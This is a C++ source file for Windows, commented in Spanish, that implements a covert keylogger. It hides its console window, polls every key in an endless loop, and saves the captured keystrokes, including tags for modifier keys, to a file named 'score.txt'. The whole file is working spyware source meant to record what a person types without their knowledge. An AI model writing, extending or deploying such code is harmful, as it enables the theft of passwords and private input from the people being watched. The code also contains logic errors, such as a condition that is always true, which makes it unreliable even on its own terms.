#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>
using namespace std;

/*-------------- CONSTANTES --------------*/
#define PLUS 43
#define COMMA 44
#define DASH 45
#define DOT 46
#define ALT 164
#define CTRL 163

/*-------------- FIN CONSTANTES --------------*/




void registerKeys();
bool verifyCapitalKey();
char getAlphaKeys(short int);
char getNumberKeys(short int);
char simpleCharacters(short int);
void hideWindow();

int main()
{
    hideWindow();
    registerKeys();
    return 0;
}

void registerKeys(){
    bool vkCapital;
    char digitAscii;
    ofstream score;
    string text;
    //Este ciclo nos ayudara a capturar siempre, la tecla que pulsa el usuario.
    while(true){
        //Comprobamos el estado de la tecla Bloq mayuscula antes de entrar al segundo ciclo
        vkCapital = verifyCapitalKey();
        //Con este ciclo detectamos la tecla pulsada por el usuario.
        for(short int i = 0; i < 255; i++){
            digitAscii = (char)VK_ESCAPE;
            //Aqu� la condici�n evalua si una tecla es presionada y gracias al ciclo for podemos saber cual es, el -32767
            //es debido a que si no se lo ponemos realiza muchas veces la acci�n de adentro del if en cambio as� solo lo hace 1 vez
            if(GetAsyncKeyState(i) == -32767 && i != VK_CAPITAL && digitAscii == (char)VK_ESCAPE && i != 1 && i != 2){
                if(i >= 65 && i <= 90){
                    digitAscii = getAlphaKeys(i);
                    if(vkCapital == false){
                        digitAscii = tolower(digitAscii);
                    }
                } else if(i >= 48 && i <= 57){
                    digitAscii = getNumberKeys(i);
                } else if(i >= 186 && i <= 191 || i == 32 ){
                    digitAscii = simpleCharacters(i);
                }
                    text += digitAscii;
                    score.open("score.txt");
                    score << text;
                    score.close();
                if((i >= 16 && i <= 27) || i == VK_BACK || i == VK_RETURN || ALT || i == VK_SNAPSHOT){
                    if(i == VK_MENU || i == ALT){
                        text += "[ALT]";
                    } else if(i == VK_CONTROL || i == CTRL){
                        text += "[CTRL]";
                    } else if(i == VK_SHIFT){
                        text += "[SHIFT]";
                    } else if(i == VK_RETURN){
                        text += "\n [ENTER]";
                    } else if(i == VK_BACK){
                        text += "[BACK]";
                    } else if(i == VK_SNAPSHOT){
                        text += "[IMP PNT]";
                    }
                    score.open("score.txt");
                    score << text;
                    score.close();
                }

                digitAscii = (char)VK_ESCAPE;
            }
        }
    }
}

//En esta funci�n detectamos si la letra de mayuscula esta activada.
bool verifyCapitalKey(){
    bool on;
    if(GetKeyState(VK_CAPITAL)){
        on = true;
    } else {
        on = false;
    }

    return on;
}

char getAlphaKeys(short int i){
    char digitAscii = (char)i;
    return digitAscii;
}

char getNumberKeys(short int i){
    char digitAscii = (char)i;
    return digitAscii;
}

char simpleCharacters(short int i){
    char digitAscii;
    if(i == 0xBB){
        digitAscii = (char)PLUS;
    } else if(i == 0xBC){
        digitAscii = (char)COMMA;
    } else if(i == 0xBD){
        digitAscii = (char)DASH;
    } else if(i == 0xBE){
        digitAscii = (char)DOT;
    } else if(i == 0x20){
        digitAscii = (char)i;
    }

    return digitAscii;
}

void hideWindow(){
    HWND stealWindow;
    AllocConsole();
    stealWindow = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealWindow, 0);
}
